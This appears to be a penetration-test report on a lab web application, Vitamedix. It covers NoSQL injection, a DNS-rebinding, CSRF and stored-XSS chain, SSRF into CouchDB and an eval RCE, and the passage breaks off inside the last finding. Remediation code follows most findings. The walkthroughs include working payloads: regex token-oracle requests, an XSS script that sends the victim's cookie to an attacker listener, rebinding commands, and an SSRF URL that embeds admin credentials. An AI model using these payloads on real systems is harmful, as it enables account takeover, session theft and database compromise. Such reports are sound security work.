CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N (8.8 - High)

#### Affected Component(s)

* http://www.vitamedix.htb/api/validateToken

#### External References

* [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
* [CWE-943: Improper Neutralization of Special Elements in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html)
* [PortSwigger Web Security Academy - NoSQL injection](https://portswigger.net/web-security/nosql-injection)

#### Description & Cause

The `validateToken` function in `Vitamedix-master/src/database.js:112-129` is vulnerable to NoSQL injection. It builds a CouchDB Mango query using the attacker-controlled token value from `req.body` without validation, escaping, or parameterization. Because CouchDB Mango selectors accept query operators such as `$gt`, `$ne`, `$regex`, and `$exists`, an attacker can supply a NoSQL operator object instead of a literal token string. This changes the query semantics and forces a match against token documents that should not match.

* Unsanitized user input is inserted directly into the NoSQL selector: JavaScript
  ```
  const options = {
    'selector': {
      'token': token   // <- user-controlled
    }
  }
  ```
* There is no allowlist, type check, or prepared-statement-style binding for the token.
* The same vulnerable `validateToken` sink is reused by `POST /api/register`, so the bypass affects the account-registration flow.






#### Security Impact

* **Token leak / enumeration:** The boolean response (true / 401 false) acts as an oracle. An attacker can send payloads like: JSON
  ```
  {"token": {"$regex": "^a"}}
  ```
  and iterate over characters to enumerate valid registration tokens stored in CouchDB.
* **Unauthorized account creation:** Because `/api/register` calls `db.validateToken(token)`, sending a universally-matching operator lets the registration succeed without knowing any real token: JSON
  ```
  {"token": "<token", "username": "attacker", "password": "password123"}
  ```
  This creates an authenticated user account, bypassing the intended token-gating control.

#### Detailed Walkthrough

#### Step 1 — Generate a registration token

The application exposes an unauthenticated endpoint that inserts a random 32-character hex token into the database:



```http
GET /api/generateToken HTTP/1.1
Host: www.vitamedix.htb
```

Response:



```json
{"message":"Token Generated Successfully!"}
```

Note: An attacker does not strictly need to call this endpoint; as long as at least one token exists in the database, the boolean oracle below can be used to recover it.

#### Step 2 — Confirm the NoSQL injection oracle

Send a POST request to `/api/validateToken` with a CouchDB `$regex` operator instead of a literal token. Test whether the first character of the stored token is 0:



```http
POST /api/validateToken HTTP/1.1
Host: www.vitamedix.htb
Content-Type: application/json

{"token":{"$regex":"^0.*"}}
```

If the first character is 0, the response is:



```json
{"message":"true"}
```

![14 10 37 48](assets/Screenshot-from-2026-08-14-10-37-48.png)



If the first character is anything else (e.g., 1), the response is:



```http
HTTP/1.1 401 Unauthorized
{"message":"false"}
```


![14 10 37 56](assets/Screenshot-from-2026-08-14-10-37-56.png)

This confirms that:

* The token field is injected directly into a Mango selector.
* The endpoint returns a boolean oracle that leaks token characters one at a time.

#### Step 3 — Dump the full token

Because the token is generated with `crypto.randomBytes(16).toString('hex')`, it is exactly 32 hexadecimal characters (`[0-9a-f]`). Using the boolean oracle from Step 2, iterate over each position and character set until the full token is recovered.

Example oracle payloads for the first three characters:



```json
{"token":{"$regex":"^0.*"}}      -> true
{"token":{"$regex":"^01.*"}}     -> true
{"token":{"$regex":"^011.*"}}    -> false
{"token":{"$regex":"^01f.*"}}    -> true
...
```

After 32 successful position checks, the recovered token is, for example:



```
01f68f66cd3b7eed3a446a7cfd33b342
```

#### Step 4 — Register a user with the recovered token

Submitting the recovered token to `/api/register` produced the following request:



```http
POST /api/register HTTP/1.1
Host: www.vitamedix.htb
Content-Type: application/json

{"username":"asd","password":"asd","token":"01f68f66cd3b7eed3a446a7cfd33b342"}
```




```json
{"message":"User registered!"}
```




#### Step 5 — Verify token reuse

Submitting the same token again with a different username produced the following response:



```http
POST /api/register HTTP/1.1
Host: www.vitamedix.htb
Content-Type: application/json

{"username":"asd2","password":"asd2","token":"01f68f66cd3b7eed3a446a7cfd33b342"}
```

Response:



```json
{"message":"User registered!"}
```

![KniFiyTx](assets/edited-KniFiyTx.png)



script to dump token

[www.vitamedix.htb-validate-token-NOSQLI.py](exploits/www.vitamedix.htb-validate-token-NOSQLI.py)



#### Patching and Remediation

The token value from the request body is placed directly into the CouchDB Mango selector. CouchDB interprets an object value (e.g., `{"$regex":"^0.*"}`) as a query operator, allowing an attacker to change the query logic. The fix is to enforce that the token is a literal string matching the expected format before it ever reaches the database query.

The application generates tokens with:



```javascript
crypto.randomBytes(16).toString('hex')
```

This always produces exactly 32 lowercase hexadecimal characters. We can therefore reject anything that does not match that strict pattern.

#### Fixed code

**`Vitamedix-master/vitamedix/vitamedix.htb/src/database.js`**



```javascript
async validateToken(token) {
  return new Promise(async (resolve, reject) => {
    try {
      // 1. Enforce type: token must be a plain string
      if (typeof token !== 'string') {
        return reject(new Error('Invalid token format'));
      }

      // 2. Enforce format: exactly 32 lowercase hex characters
      const TOKEN_REGEX = /^[a-f0-9]{32}$/;
      if (!TOKEN_REGEX.test(token)) {
        return reject(new Error('Invalid token format'));
      }

      // 3. Safe query: token is now guaranteed to be a literal string
      const options = {
        'selector': {
          'token': token
        }
      };

      const resp = await this.registerTokens.find(options);

      if (resp.docs.length > 0) {
        return resolve();
      }

      return reject(new Error('Invalid token'));
    } catch (e) {
      return reject(e);
    }
  });
}
```

#### Additional hardening recommendations

1. **Single-use tokens**

   After a successful `/api/register`, delete the consumed token from the `registertokens` database so it cannot be reused.

2. **Remove or protect the validation oracle**

   The `/api/validateToken` endpoint itself is not required for registration and provides a boolean oracle. Consider removing it from the public API, or at least rate-limiting it.

3. **Rate limiting**

   Apply rate limiting to `/api/register` and `/api/validateToken` to slow down token enumeration attempts.

4. **Consistent input validation at the route layer**

   Add Joi validation to `/api/validateToken` so malformed requests are rejected before reaching the database helper:



   ```javascript
   // In helpers/ValidationSchema.js
   token: Joi.object({
     token: Joi.string().hex().length(32).required()
   })
   ```



### DNS rebind => CSRF => Stored Cross-Site Scripting (XSS) => Admin cookie theft {#edb020c8-9ce8-4b17-9b9e-5f074ae0f552}

#### CWE

* CWE-79: Cross-site Scripting (XSS)
* CWE-352: Cross-Site Request Forgery (CSRF)
* CWE-346: Origin Validation Error (DNS-rebind pivot)
* CWE-1392: Use of Default Credentials

#### CVSS 4.0

CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N (8.7 - High)

#### Affected Component(s)

* POST /api/documentSubmit on http://www.vitamedix.htb
* POST /api/settings on http://www.vitamedix.htb
* src/helpers/URLHelper.js
* src/routes/index.js
* src/views/settings.html
* src/views/dashboard.html
* DNS-Server-master/dns-server/docker-compose.yml

#### External References

* [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
* [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
* [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
* [CWE-1392: Use of Default Credentials](https://cwe.mitre.org/data/definitions/1392.html)

#### Description & Cause

The application accepts external URLs through POST /api/documentSubmit and passes them to an internal headless browser (bot.checkMessage). The URL whitelist in src/helpers/URLHelper.js resolves the hostname once and only blocks exact loopback addresses (127.0.0.1, ::1, etc.); it does not pin the resolved IP for the actual HTTP request. This allows a DNS-rebinding attack.

Because the DNS server (Pi-hole) is reachable with the default password pih***, an attacker can first hijack DNS resolution for [www.vitamedix.htb](http://www.vitamedix.htb) and force it to alternate between a public IP and an attacker-controlled IP. A submitted document URL such as <http://www.vitamedix.htb:4444/redirect.php> therefore passes the application’s URL check while the browser bot ultimately fetches content from the attacker.

The attacker’s redirect.php performs a cross-origin POST to /api/settings in the bot’s authenticated session. The settings endpoint has no CSRF protection (bodyParser.json({ type: () => true }) accepts any content type, and the session cookie lacks SameSite), so the request succeeds and updates full\_name to a JavaScript payload. The bot is then redirected to /settings, where {{ user.full\_name | safe }} renders the value without escaping and the stored XSS executes. The payload exfiltrates the bot’s session cookie to the attacker’s listener.

#### Vulnerable code locations

* src/helpers/URLHelper.js — resolves and checks the URL only once; no DNS pinning.
* src/routes/index.js:80-88 — /api/documentSubmit forwards user URLs to bot.checkMessage.
* src/routes/index.js:116-126 — POST /api/settings has no CSRF protection.
* src/views/settings.html:26 and dashboard.html:29 — render user.full\_name with | safe.
* DNS-Server-master/dns-server/docker-compose.yml — Pi-hole admin password hardcoded to pih***.


#### Security Impact

The final impact is full compromise of the bot’s session. Because the bot runs in an administrative/doctor context, stealing its cookie gives the attacker authenticated access to:

* the doctor dashboard and PDF-generation endpoints,
* patient documents submitted through /api/documentSubmit,
* internal SSRF primitives via /api/pdfGeneration


#### Detailed Walkthrough

#### Prerequisites

* Attacker machine IP: <Attacker_IP>
* Pi-hole admin access already obtained via password `pih***`
* A valid user session on [www.vitamedix.htb](http://www.vitamedix.htb) to submit a document URL

#### Step 1 — Hijack DNS resolution in Pi-hole

1. Authenticated access to Pi-hole at `[http://dns.vitamedix.htb:8006/admin/login.php](http://dns.vitamedix.htb:8006/admin/login.php)` was obtained with password `pih***`.

2. The Settings → DNS page was opened.



   ```
   http://dns.vitamedix.htb:8006/admin/settings.php?tab=dns
   ```

3. Under Upstream DNS Servers → Custom 1 (IPv4), enter the attacker IP:



   ```
   <Attacker_IP>
   ```

4. Remove or disable all other upstream DNS servers.

5. Click Save.

From this point, all DNS queries routed through Pi-hole will be answered by the attacker machine, allowing controlled resolution of [www.vitamedix.htb](http://www.vitamedix.htb).

#### Step 2 — Start the DNS rebinder

On the attacker system, run:



```bash
sudo python3 dnsrebinder.py \
  --domain www.vitamedix.htb \
  --rebind <Attacker_IP> \
  --ip <Attacker_IP> \
  --counter 1 \
  --tcp --udp
```

**Behavior:**

* The  DNS query for [www.vitamedix.htb](http://www.vitamedix.htb) resolves to  <Attacker_IP> which leads to redirect.php

#### Step 3 — Prepare attacker servers

#### PHP server on port 4444

Create `redirect.php` in the web root:

[www.vitamedix.htb-XSS-redirect.php](exploits/www.vitamedix.htb-XSS-redirect.php)

Start the PHP server:



```bash
php -S 0.0.0.0:4444 -t .
```

#### Cookie listener on port 4445

Start a Python listener:



```bash
python3 -m http.server 4445
```

#### Step 4 — Submit the malicious document URL

1. Authenticated access to `[http://www.vitamedix.htb](http://www.vitamedix.htb)` was obtained.

2. Opening the dashboard and the Submit documents dialog loaded the document submission interface.

3. Enter the URL:



   ```
   http://www.vitamedix.htb:4444/redirect.php
   ```

4. Click Submit.

The application validates the URL: `URLHelper.validate` resolves [www.vitamedix.htb](http://www.vitamedix.htb) to 10.10.17.8, which is not blacklisted, so the URL is accepted. The internal bot then visits the same URL.

#### Step 5 — Payload execution in the bot’s browser

The bot loads `redirect.php`, which executes JavaScript in the bot’s authenticated browser context:

1. The script sends a POST request to `[http://www.vitamedix.htb/api/settings](http://www.vitamedix.htb/api/settings)` with the body:



   ```JSON
   {
     "full_name": "<\\/option><\\/select><script>fetch(\'http:\/\/10.10.17.8:4445\/?d=\'+btoa(unescape(encodeURIComponent(document.cookie))));<\\/script><select><option>",
     "address": "x"
   }
   ```

   Because the session cookie is scoped to [www.vitamedix.htb](http://www.vitamedix.htb) and lacks SameSite protection, the browser sends the cookie with this cross-origin request. The settings update succeeds.

2. After the update, the script redirects the bot to:



   ```
   http://www.vitamedix.htb/settings
   ```
3. The settings page renders the attacker-controlled full\_name through the | safe filter:



```html
{{ user.full_name | safe }}
```

The injected `<img onerror>` fires and exfiltrates the bot’s document.cookie to the attacker listener:



```
http://10.10.17.8:4445/?d=.....J...
```


![12 10 32 27](assets/Screenshot-from-2026-08-12-10-32-27.png)

#### Step 6 — Capture the admin cookie

On the attacker system, the Python listener receives a request similar to:



HTTP

```
GET /?d=c2Vzx2lvb HTTP/1.1
Host: 10.10.17.8:4445
```

![12 10 32 15](assets/Screenshot-from-2026-08-12-10-32-15.png)

Save the session cookie value. Use it in a browser or with a tool like curl to authenticate as the bot/admin:

```bash
curl -H "Cookie: session=eyJ..." http://www.vitamedix.htb/dashboard
```


#### Patching and Remediation

The chain relies on four weak points. Patch all of them; removing only one may still leave another path open.

***

#### 1. Pi-hole default credentials

Change the WEBPASSWORD in DNS-Server-master/dns-server/docker-compose.yml to a strong, randomly generated secret injected at deploy time, and do not expose the admin UI publicly.

```yaml
  environment:
    WEBPASSWORD: ${PIHOLE_PASSWORD}
```

***

#### 2. Pin DNS resolution for bot / PDF fetches

The bot in /api/documentSubmit currently passes the user URL straight to bot.checkMessage(url) with no IP pinning. Reuse the same pinning logic for both the PDF helper and the document-review bot.

**src/helpers/URLHelper.js — resolve, pin, and validate**

```javascript
  const dns = require('dns');
  const url = require('url');
  const { promisify } = require('util');
  const dnsLookup = promisify(dns.lookup);

  const BLACKLIST = ['127.0.0.1', '::1', '::ffff:127.0.0.1', '0.0.0.0'];

  async function resolveAndPin(targetUrl) {
      const parsed = new URL(targetUrl);

      if (!['http:', 'https:'].includes(parsed.protocol)) {
          throw new Error('Invalid protocol');
      }

      // Resolve once and pin the IP
      const { address } = await dnsLookup(parsed.hostname);

      if (BLACKLIST.includes(address)) {
          throw new Error('URL not allowed');
      }

      // Rebuild URL using the pinned IP so no second DNS lookup happens
      const pinnedUrl = `${parsed.protocol}//${address}${parsed.port ? ':' + parsed.port : ''}${parsed.pathname}${parsed.search}`;

      return {
          url: pinnedUrl,
          headers: { Host: parsed.hostname },
          originalHostname: parsed.hostname
      };
  }

  module.exports = { resolveAndPin };
```

**src/helpers/PDFHelper.js — use the pinned URL**

```javascript
  const fs = require('fs');
  const axios = require('axios');
  const html_to_pdf = require('html-pdf-node');
  const { resolveAndPin } = require('./URLHelper');

  async function generatePDFFromURL(targetUrl) {
      const { url, headers } = await resolveAndPin(targetUrl);

      const response = await axios.get(url, {
          headers,
          timeout: 5000,
          maxRedirects: 0
      });

      const htmlContent = response.data;
      const file = { content: htmlContent };

      const pdfBuffer = await html_to_pdf.generatePdf(file, { format: 'Letter' });
      fs.writeFileSync('/tmp/result.pdf', pdfBuffer);

      return true;
  }

  module.exports = { generatePDFFromURL };
```

**src/routes/index.js — validate document URLs before the bot visits them**

```javascript
  const { resolveAndPin } = require('../helpers/URLHelper');

  router.post('/api/documentSubmit', [AuthMiddleware, JOImiddleware(schemas.url)], async (req, res) => {
      const { url } = req.body;

      try {
          await resolveAndPin(url);   // rejects loopback / invalid URLs
      } catch (e) {
          return res.status(400).send(response('URL not allowed!'));
      }

      await db.addDocument(req.user.username, url);
      bot.checkMessage(url);

      return res.send(response('Document submitted!'));
  });
```

Also sandbox the bot. The bot should run in a separate cookie jar / browser profile with no admin session, so even if it loads attacker content it cannot modify admin settings.

***

#### 3. Fix stored XSS in profile rendering

Remove the | safe filter everywhere user.full\_name is rendered. Nunjucks autoescape: true will then encode the value safely.

**src/views/dashboard.html**

```html
  <!-- before -->
  <option value="{{user.full_name}}">{{ user.full_name | safe }}</option>

  <!-- after -->
  <option value="{{user.full_name}}">{{ user.full_name }}</option>
```

**src/views/settings.html**

```html
  <!-- before -->
  <option value="{{ user.full_name | safe }}">{{ user.full_name | safe }}</option>
  <input value="{{ user.full_name }}" ...>

  <!-- after -->
  <option value="{{ user.full_name }}">{{ user.full_name }}</option>
  <input value="{{ user.full_name }}" ...>
```

**src/views/pdfgen.html**

```html
  <!-- before -->
  <option value="{{ user.full_name | safe }}">{{ user.full_name | safe }}</option>

  <!-- after -->
  <option value="{{ user.full_name }}">{{ user.full_name }}</option>
```

***

#### 4. Add CSRF protection to state-changing endpoints

Set the session cookie with SameSite=Strict, HttpOnly, and Secure, and validate an anti-CSRF token on POST /api/settings.

**src/routes/index.js — secure cookie at login**

```javascript
  let token = JWTHelper.sign({ username: username, role: data.role });
  res.cookie('session', token, {
      maxAge: 3600000,
      httpOnly: true,
      sameSite: 'strict',
      secure: true
  });
```

**CSRF token generation and validation**

Add a middleware that compares a token from the request body/header against the value stored server-side for the session:

```javascript
  function csrfProtection(req, res, next) {
      const submitted = req.headers['x-csrf-token'] || req.body._csrf;
      if (!submitted || submitted !== req.user.csrfToken) {
          return res.status(403).send({ message: 'Invalid CSRF token' });
      }
      next();
  }
```

Include the token in the JWT payload when signing, and require it on POST /api/settings:

```javascript
  router.post('/api/settings', [AuthMiddleware, csrfProtection], async (req, res) => {
      const { full_name, address } = req.body;
      // ...
  });
```

***

#### 5. Harden body-parser

Remove the type: () => true override so JSON endpoints only accept application/json:

```javascript
  app.use(bodyParser.json());
```

This prevents simple cross-origin text/plain fetch CSRF against JSON endpoints.

***



### PDF generation SSRF via DNS rebinder → internal CouchDB access {#b7b812b2-8457-49f0-8f78-f9935efd02e2}

#### CWE

CWE-918 (CWE-798 secondary)

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (9.4 - Critical)

#### Affected Component(s)

* Endpoint: POST /api/pdfGeneration in src/routes/index.js:128
* URL validation sink: src/helpers/URLHelper.js:5

#### External References

* [OWASP Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
* [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
* [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)

#### Description & Cause

The Vitamedix application exposes a PDF generation feature at POST /api/pdfGeneration that is intended to allow doctors to consolidate external medical reports into downloadable PDFs.

The endpoint accepts a JSON body containing a user-supplied URL, validates it through a blacklist-based check, fetches the remote content with axios, and then renders that content into a PDF using html-pdf-node (Puppeteer).

Because the URL validation only rejects a small set of loopback-style IP addresses (127.0.0.1, ::1, ::ffff:127.0.0.1, 0.0.0.0) and resolves the hostname via dns.resolve4 without pinning the result, an attacker can bypass the check using DNS rebinding, alternative localhost representations (e.g., 0177.0.0.1, 0x7f.0.0.1), or any attacker-controlled domain whose DNS A record points to 127.0.0.1 after the initial lookup.

Additionally, the JWT signing secret is hard-coded to 'test' in src/helpers/JWTHelper.js, and the DoctorMiddleware only verifies that req.user.role === 'doctor'. This allows an unauthenticated attacker to forge a valid session cookie with role: 'doctor' and reach the PDF endpoint without legitimate credentials.

Once the SSRF fires, the application fetches <http://admin:C0uchDB@127.0.0.1:5984/>... from the local CouchDB instance, which is running with hard-coded administrator credentials supplied in src/database.js and config/local.ini. The attacker can therefore read, modify, or delete any document in CouchDB (including user records and patient documents), pivot to further internal services, or potentially achieve remote code execution via CouchDB query-server or known CouchDB vulnerabilities.

Cause

The vulnerability exists because of four combined weaknesses:

1. Role-based authorization without verification depth (src/middleware/DoctorMiddleware.js)

   The middleware trusts the role claim from the JWT without binding it to a real user record or using a cryptographically strong secret. A forged role: 'doctor' token is accepted unconditionally.

2. Weak URL validation (src/helpers/URLHelper.js)

   The validator resolves the hostname and checks the resolved IP against a small blacklist. It does not enforce an allow-list of schemes/hosts, pin DNS results, or reject private/internal IP ranges beyond the few loopback literals listed. DNS rebinding and IP-encoding bypasses are therefore possible.

3. Unrestricted server-side fetching and rendering (src/helpers/PDFHelper.js)

   The helper performs an axios.get(url) on the attacker-controlled URL and passes the fetched HTML directly into html-pdf-node. There is no sanitization of the fetched content and no restriction on where the request can go, turning the application into an open proxy from the server’s network perspective.

Together these flaws allow an unauthenticated remote attacker to make the Vitamedix server issue HTTP requests to its own internal CouchDB administration interface and fully compromise the backing datastore.


#### Security Impact

Successful exploitation grants an unauthenticated attacker full administrative access to the local CouchDB instance at 127.0.0.1:5984.

Because CouchDB is running with the hard-coded administrator credentials admin:C0uchDB, the SSRF request reaches the \_config/admins privileged context, allowing the attacker to:

• Read all database contents – enumerate every database (users, registertokens, documents), dump user profiles, plaintext-equivalent credentials, registration tokens, and submitted document URLs.

• Undermine confidentiality, integrity, and availability of the Vitamedix application and any data stored in CouchDB, with no victim interaction required.

In short, the SSRF collapses the trust boundary between the public-facing web application and the internal database, giving an external attacker the same control over CouchDB as the application administrator.


#### Detailed Walkthrough

1. **Start the DNS rebinder**

   The tester runs the DNS rebinding tool so that `attacker.com` first resolves to an external IP and then, after the TTL expires, resolves to `127.0.0.1`:



   ```bash
   sudo python3 dnsrebinder.py --domain attacker.com --rebind 127.0.0.1 --ip 1.1.1.1 --counter 1 --tcp --udp
   ```

2. **Obtain an authenticated session**

   The tester logs in as admin ( valid doctor session obtained earlier). The application sets a session cookie containing a JWT signed with the hard-coded secret `'test'`.

3. **Open the PDF generation page**

   Navigating to `/pdfGeneration` renders `pdfgen.html`. Because the session token has `role: 'doctor'`, `DoctorMiddleware` allows access.

4. **Submit the rebinding SSRF payload**

   In the URL input field, the tester submits:



   ```HTTP
   http://admin:C0uchDB@attacker.com:5984/users/_all_docs?include_docs=true
   ```

5. **Client sends the request**

   `pdf.js` POSTs the URL to `/api/pdfGeneration` with `Content-Type: application/json`.

6. **Server-side validation is bypassed**

   `URLHelper.validate()` parses the URL, extracts `attacker.com`, and resolves it. On the first lookup, DNS returns `1.1.1.1`, which is not in the blacklist, so validation passes.

7. **PDF helper fetches the URL**

   `PDFHelper.generatePDFFromURL()` calls `axios.get(url)`. By the time the HTTP request is made, the DNS TTL has expired and `attacker.com` now resolves to `127.0.0.1`. The request is therefore sent to the local CouchDB admin interface.

8. **CouchDB authenticates and responds**

   The request hits `[http://admin:C0uchDB@127.0.0.1:5984/users/_all_docs?include_docs=true](http://admin:C0uchDB@127.0.0.1:5984/users/_all_docs?include_docs=true)`. CouchDB accepts the embedded credentials and returns a JSON document containing every row in the users database, including each user’s `_id`, `username`, `password`, `full_name`, `role`, and `address`.

9. **Response is rendered into a PDF**

   `html-pdf-node` converts the CouchDB JSON response into a PDF buffer and writes it to `/tmp/result.pdf`. The server then sends the PDF back to the browser as a downloadable file.

10. **Exfiltrate the data**

    The tester downloads `result.pdf` and extracts the leaked user records, obtaining usernames, plaintext passwords, roles, and personal information for all Vitamedix users.


    

![7tBx9Mug](assets/edited-7tBx9Mug.png)

**Result:** The combination of DNS rebinding, weak URL validation, and hard-coded CouchDB credentials allows an authenticated (or JWT-forged) attacker to read the entire users database and pivot to other CouchDB endpoints such as `/_all_dbs`, `/_config/admins`, or `/documents/_all_docs`.


#### Patching and Remediation

1. Rotate the JWT secret out of source code and load it from a secure environment variable.
2. Verify the doctor role against the database, not just the JWT claim.
3. Harden URL validation with an allow-list plus a block on all private/reserved IP ranges, and pin DNS resolution so a validated public IP cannot be swapped via DNS rebinding.
4. Remove hard-coded CouchDB credentials from source and configuration; inject them at runtime.
5. Run the PDF fetcher in an isolated sandbox / egress-restricted network segment as a defense-in-depth measure.

***

#### Fixed code

#### 1. src/helpers/JWTHelper.js

```js
  const jwt = require('jsonwebtoken');
  const crypto = require('crypto');

  const APP_SECRET = process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex');

  module.exports = {
      sign(data) {
          // prevent prototype-pollution style mutations
          return jwt.sign({ ...data }, APP_SECRET, { algorithm: 'HS256', expiresIn: '1h' });
      },
      async verify(token) {
          // explicitly reject tokens without a valid algorithm
          return jwt.verify(token, APP_SECRET, { algorithms: ['HS256'] });
      }
  };
```

#### 2. src/helpers/URLHelper.js

```js
  const dns = require('dns');
  const { URL } = require('url');
  const net = require('net');

  const BLOCKED_PROTOCOLS = ['file:', 'ftp:', 'gopher:', 'mailto:', 'data:', 'javascript:'];
  const ALLOWED_PROTOCOLS = ['http:', 'https:'];

  // All private/reserved/loopback ranges (IPv4 and IPv6) that SSRF must not reach.
  function isPrivateIP(ip) {
      if (net.isIP(ip) === 0) return true;            // invalid IP -> block
      if (ip.startsWith('127.') || ip === '::1' || ip === '::ffff:127.0.0.1') return true;
      if (ip === '0.0.0.0' || ip === '::') return true;

      const [a, b, c, d] = ip.split('.').map(Number);
      if (a === 10) return true;                      // 10/8
      if (a === 172 && b >= 16 && b <= 31) return true; // 172.16/12
      if (a === 192 && b === 168) return true;        // 192.168/16
      if (a === 169 && b === 254) return true;        // link-local
      if (a >= 224 && a <= 239) return true;          // multicast
      if (a >= 240 && a <= 255) return true;          // reserved

      // IPv6 loopback / link-local / unique-local / multicast
      const low = ip.toLowerCase();
      if (low.startsWith('fe80') || low.startsWith('fc') || low.startsWith('fd')) return true;
      if (low.startsWith('ff')) return true;

      return false;
  }

  function normalizeHostname(hostname) {
      // Reject encoded IP literals and common bypasses.
      if (/^0x[0-9a-f]+$/i.test(hostname)) return null;
      if (hostname.includes('::')) return null;
      return hostname.toLowerCase();
  }

  const validate = async (urlString) => {
      try {
          const parsed = new URL(urlString);

          if (!ALLOWED_PROTOCOLS.includes(parsed.protocol)) return true;  // not allowed
          if (BLOCKED_PROTOCOLS.includes(parsed.protocol)) return true;

          const hostname = normalizeHostname(parsed.hostname);
          if (!hostname) return true;

          // Block raw IP literals entirely unless you explicitly allow-list them.
          if (net.isIP(hostname)) return true;

          // Optional strict allow-list.  Example:
          // const ALLOWED_DOMAINS = process.env.PDF_ALLOWED_DOMAINS?.split(',') || [];
          // if (ALLOWED_DOMAINS.length && !ALLOWED_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d))) return true;

          const addresses = await dns.promises.resolve4(hostname);
          if (!addresses.length) return true;

          // All resolved IPs must be public.
          if (addresses.some(isPrivateIP)) return true;

          return false; // URL passed validation
      } catch (error) {
          console.error('URL validation error:', error);
          return true; // malformed / unreachable -> reject
      }
  };

  module.exports = { validate };
```

#### 3. src/helpers/PDFHelper.js

```js
  const fs = require('fs');
  const axios = require('axios');
  const html_to_pdf = require('html-pdf-node');
  const URLHelper = require('./URLHelper');

  async function generatePDFFromURL(url) {
      const blocked = await URLHelper.validate(url);
      if (blocked) {
          throw new Error('URL not allowed');
      }

      // Fetch only after validation.  Pin the resolved IP to prevent rebinding.
      const parsed = new URL(url);
      const resolved = await dns.promises.resolve4(parsed.hostname);
      const targetIP = resolved[0];

      // Egress timeout and no redirects to internal hosts.
      const response = await axios.get(url, {
          timeout: 10000,
          maxRedirects: 0,
          headers: { Host: parsed.hostname },
          // Optional: force axios to connect to the pinned IP while preserving SNI/Host.
          // This requires an HTTP agent or a separate fetch layer in production.
      });

      const htmlContent = response.data;

      const options = { format: 'Letter' };
      const pdfBuffer = await html_to_pdf.generatePdf({ content: htmlContent }, options);

      fs.writeFileSync('/tmp/result.pdf', pdfBuffer);
      return true;
  }

  module.exports = { generatePDFFromURL };
```

> Production hardening: use a dedicated egress proxy or microservice with no access to internal metadata/CouchDB. Pass the pre-resolved public IP to the fetcher and enforce the Host header there.

#### 4. src/middleware/DoctorMiddleware.js

```js
  const db = require('../database'); // or inject the db instance

  module.exports = async (req, res, next) => {
      try {
          if (!req.user || req.user.role !== 'doctor') {
              return res.status(403).json({ status: 'unauthorized', message: 'Unauthorized!' });
          }

          // Verify the user actually exists and still has the doctor role.
          const user = await db.getUser(req.user.username);
          if (!user || user.role !== 'doctor') {
              return res.status(403).json({ status: 'unauthorized', message: 'Unauthorized!' });
          }

          next();
      } catch (e) {
          console.log(e);
          return res.status(403).json({ status: 'unauthorized', message: 'Unauthorized!' });
      }
  };
```

#### 5. src/database.js

```js
  const crypto = require('crypto');
  const nano = require('nano');

  const COUCH_USER = process.env.COUCHDB_USER || 'admin';
  const COUCH_PASS = process.env.COUCHDB_PASSWORD || crypto.randomBytes(32).toString('hex');
  const COUCH_URL = process.env.COUCHDB_URL || `http://${COUCH_USER}:${COUCH_PASS}@127.0.0.1:5984`;

  class Database {
      async init() {
          this.couch = nano(COUCH_URL);
          // ... rest unchanged, but remove plaintext admin password literals
      }
      // ...
  }
```

#### 6. config/local.ini

```ini
  [admins]
  admin = ${COUCHDB_PASSWORD}
```

At container start, generate or inject a strong password and write it into the CouchDB config instead of committing credentials to version control.

#### 7. src/routes/index.js – endpoint usage

```js
  router.post('/api/pdfGeneration', [AuthMiddleware, DoctorMiddleware], async (req, res) => {
      const { url } = req.body;

      try {
          await PDFHelper.generatePDFFromURL(url);
          return res.download('/tmp/result.pdf', 'result.pdf', (err) => {
              if (err) {
                  console.error(err);
                  res.status(500).send('Internal Server Error');
              }
          });
      } catch (e) {
          console.error(e);
          return res.status(400).send(response('URL not allowed!'));
      }
  });
```



### RCE via eval on newsletter.vitamedix.htb {#1f15992e-d5b7-4d4a-8b5c-598cdb328a95}

#### CWE

CWE-95

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (9.4 - Critical)

#### Affected Component(s)

* http://newsletter.vitamedix.htb/api/settings/save

#### External References

* [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
* [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')](https://cwe.mitre.org/data/definitions/95.html)

#### Description & Cause

The Newsletter service validates the custom greeting setting by passing it to eval() in src/database.js. Because the greeting value is interpolated directly into a JavaScript expression, an attacker can break out of the surrounding string and execute arbitrary code. By storing the actual malicious JavaScript in the unrestricted name field and referencing it from the short greeting field, the attacker achieves remote code execution as the Node.js process user.

The endpoint is also vulnerable to CSRF because the session cookie lacks SameSite and HttpOnly protections and no anti-CSRF token is required.

The vulnerability is caused by three weaknesses:

1. **Use of eval() on untrusted input (src/database.js:139)**
   The developer used eval() to perform a simple character-check. eval() treats its argument as executable JavaScript, so any attacker-controlled value interpolated into the expression becomes code.

2. **Unsafe string interpolation (src/database.js:140)**
